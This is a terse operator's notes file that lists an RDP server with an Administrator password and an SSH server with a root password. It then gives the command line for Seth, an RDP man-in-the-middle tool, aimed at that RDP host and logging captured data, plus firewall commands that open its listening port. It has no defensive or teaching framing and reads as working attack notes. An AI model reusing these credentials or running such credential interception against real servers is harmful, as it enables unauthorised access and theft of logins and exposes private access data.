*************** RDP *******************
192.210.239.122:24931 \ Administrator \ DF#664lj284#

=============== SSH ===================
107.172.143.102:32867 \ root \ Iue@948$dNNw


/////////////// Cmd ///////////////////
Seth/seth.py -p 1212 192.210.239.122 24931 --check-port 8080 -o log.txt

=================================================================================
python3 seth.py -c <cert> -k <private key> -p <listen port> server_ip server_port 

------------ firewall ------------------
$ firewall-cmd --zone=public --add-port=1212/tcp --permanent
$ firewall-cmd --reload

$ firewall-cmd --zone=public --remove-port=1212/tcp
$ firewall-cmd --runtime-to-permanent 
$ firewall-cmd --reload 